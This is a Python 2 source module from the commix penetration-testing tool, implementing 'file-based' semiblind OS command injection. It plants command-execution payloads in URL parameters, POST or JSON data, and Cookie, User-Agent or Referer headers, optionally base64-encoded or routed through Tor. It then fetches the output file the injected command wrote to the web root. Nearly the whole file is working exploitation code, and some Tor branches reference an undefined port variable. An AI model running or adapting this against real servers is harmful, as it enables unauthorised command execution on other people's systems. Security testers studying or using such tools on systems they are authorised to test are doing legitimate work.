#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import json
import string
import random
import base64
import urllib
import urllib2
import urlparse

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.controller import checks
from src.core.injections.semiblind.techniques.file_based import fb_payloads

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Get the response of the request
"""
def get_request_response(request):

  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()
      
  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  else:
    try:
      response = urllib2.urlopen(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
      pass
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  return response

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):
                      
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Encoding spaces.
    payload = payload.replace(" ","%20")
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)
    
    try:
      # Get the response of the request
      response = get_request_response(request)
    except KeyboardInterrupt:
      response = None

  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)

    # Define the POST data  
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      data = json.loads(data, strict = False)
      request = urllib2.Request(url, json.dumps(data))

    # Check if defined extra headers.
    headers.do_check(request)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    
    try:
      # Get the response of the request
      response = get_request_response(request)
    except KeyboardInterrupt:
      response = None

  return response, vuln_parameter

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):

  def inject_cookie(url, vuln_parameter, payload, proxy):
    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)
    opener.addheaders.append(('Cookie', vuln_parameter + "=" + payload))
    request = urllib2.Request(url)
    # Check if defined extra headers.
    headers.do_check(request)
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_cookie(url, vuln_parameter, payload, proxy)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  else:
    try:
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  return response

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):

  def inject_user_agent(url, vuln_parameter, payload, proxy):

    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    request.add_header('User-Agent', urllib.unquote(payload))
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_user_agent(url, vuln_parameter, payload, proxy)
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  else:
    try:
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  return response

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):

  def inject_referer(url, vuln_parameter, payload, proxy):

    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    request.add_header('Referer', urllib.unquote(payload))
    response = opener.open(request)
    return response

  proxy = None 
  response = inject_referer(url, vuln_parameter, payload, proxy)
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  else:
    try:
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          raise SystemExit()
      response = False 
    except urllib2.URLError, err:
      if "Connection refused" in err.reason:
        print "\n" + Back.RED + "(x) Critical: The target host is not responding." + \
              " Please ensure that is up and try again." + Style.RESET_ALL
      raise SystemExit()

  return response

"""
The main command injection exploitation.
"""
def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):

  # Execute shell commands on vulnerable host.
  if alter_shell :
    payload = fb_payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE) 
  else:
    payload = fb_payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE) 

  # Fix prefixes / suffixes
  payload = parameters.prefixes(payload, prefix)
  payload = parameters.suffixes(payload, suffix)

  if menu.options.base64:
    payload = base64.b64encode(payload)   

  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
  
  # Check if defined cookie with "INJECT_HERE" tag
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    response = cookie_injection_test(url, vuln_parameter, payload)

  # Check if defined user-agent with "INJECT_HERE" tag
  elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
    response = user_agent_injection_test(url, vuln_parameter, payload)
    
  # Check if defined referer with "INJECT_HERE" tag
  elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
    response = referer_injection_test(url, vuln_parameter, payload)

  else:
    # Check if defined method is GET (Default).
    if http_request_method == "GET":

      # Check if its not specified the 'INJECT_HERE' tag
      #url = parameters.do_GET_check(url)

      payload = payload.replace(" ","%20")

      target = re.sub(settings.INJECT_TAG, payload, url)
      vuln_parameter = ''.join(vuln_parameter)
      request = urllib2.Request(target)
      
      # Check if defined extra headers.
      headers.do_check(request)        
        
      # Get the response of the request
      response = get_request_response(request) 

    else :
      # Check if defined method is POST.
      parameter = menu.options.data
      parameter = urllib2.unquote(parameter)

      # Check if its not specified the 'INJECT_HERE' tag
      parameter = parameters.do_POST_check(parameter)
      
      # Define the POST data  
      if settings.IS_JSON == False:
        data = re.sub(settings.INJECT_TAG, payload, parameter)
        request = urllib2.Request(url, data)
      else:
        payload = payload.replace("\"", "\\\"")
        data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
        data = json.loads(data, strict = False)
        request = urllib2.Request(url, json.dumps(data))
        
      # Check if defined extra headers.
      headers.do_check(request)        
        
      # Get the response of the request
      response = get_request_response(request)

  return response

"""
Find the URL directory.
"""
def injection_output(url, OUTPUT_TEXTFILE, delay):
  if menu.options.srv_root_dir:

    # Check for Apache server root directory.
    if "/var/www/" in menu.options.srv_root_dir:
      path = menu.options.srv_root_dir.replace("/var/www/", "/")
      if "html/" in menu.options.srv_root_dir:
        path = path.replace("html/", "")

    # Check for Nginx server root directory.  
    elif "/usr/share/" in menu.options.srv_root_dir:
      path = menu.options.srv_root_dir.replace("/usr/share/", "/")
      if "html/" in menu.options.srv_root_dir:
        path = path.replace("html/", "")
      elif "www/" in menu.options.srv_root_dir:
        path = path.replace("www/", "")  

    else:
    	path = "/"

    # Contract again the url.	
    scheme = urlparse.urlparse(url).scheme
    netloc = urlparse.urlparse(url).netloc
    output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE	

  else:
    if settings.CUSTOM_SRV_ROOT_DIR == True:
      path = "/"
      # Contract again the url. 
      scheme = urlparse.urlparse(url).scheme
      netloc = urlparse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE

    else:
      path = urlparse.urlparse(url).path
      if path.endswith('/'):
        # Contract again the url.
        scheme = urlparse.urlparse(url).scheme
        netloc = urlparse.urlparse(url).netloc
        output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
      else:
        path_parts = [non_empty for non_empty in path.split('/') if non_empty]
        count = 0
        for part in path_parts:        
          count = count + 1
        count = count - 1
        last_param = path_parts[count]
        output = url.replace(last_param, OUTPUT_TEXTFILE)

  return output

"""
Command execution results.
"""
def injection_results(url, OUTPUT_TEXTFILE, delay):
  #Find the directory.
  output = injection_output(url, OUTPUT_TEXTFILE, delay)

  # Check if defined extra headers.
  request = urllib2.Request(output)
  headers.do_check(request)
  
  # Evaluate test results.
  try:
    output = urllib2.urlopen(request)
    html_data = output.read()
    shell = re.findall(r"(.*)", html_data)
    if settings.TARGET_OS == "win":
      shell = [newline.replace("\r","") for newline in shell]
      shell = [space.strip() for space in shell]
      shell = [empty for empty in shell if empty]
  except urllib2.HTTPError, e:
    if e.getcode() == 404:
      shell = ""
  return shell

#eof